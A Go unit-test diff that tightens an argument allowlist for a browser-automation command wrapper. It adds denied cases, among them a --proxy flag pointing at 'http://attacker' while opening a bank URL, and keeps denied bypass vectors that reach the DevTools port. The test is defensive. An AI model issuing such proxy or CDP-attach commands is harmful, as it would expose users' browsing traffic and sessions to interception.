@@ -9,8 +9,9 @@ func TestAllowlist(t *testing.T) {
 	}{
 		{[]string{"open", "https://example.com"}, true},
 		{[]string{"snapshot"}, true},
-		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "open", "https://x"}, true},
-		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "--state", "/p.enc", "open", "https://x"}, true},
+		// --executable-path is now a denied (unknown) flag — orchestrator injects it server-side:
+		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "open", "https://x"}, false},
+		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "--state", "/p.enc", "open", "https://x"}, false},
 		{[]string{"click", "@e1"}, true},
 		{[]string{"get", "text", "body"}, true},
 		// bypass vectors that MUST be denied:
@@ -20,6 +21,12 @@ func TestAllowlist(t *testing.T) {
 		{[]string{"connect", "9222"}, false},
 		{[]string{"get", "cdp-url"}, false},
 		{[]string{}, false},
+		// dangerous exfil flags — MUST be denied:
+		{[]string{"--proxy", "http://attacker", "open", "https://bank"}, false},
+		{[]string{"--headers", "{}", "open", "https://x"}, false},
+		// benign value flag and plain verbs:
+		{[]string{"--timeout", "5000", "snapshot"}, true},
+		{[]string{"open", "https://x"}, true},
 	}
 	for _, c := range cases {
 		if got := ExecAllowed(c.args); got != c.ok {
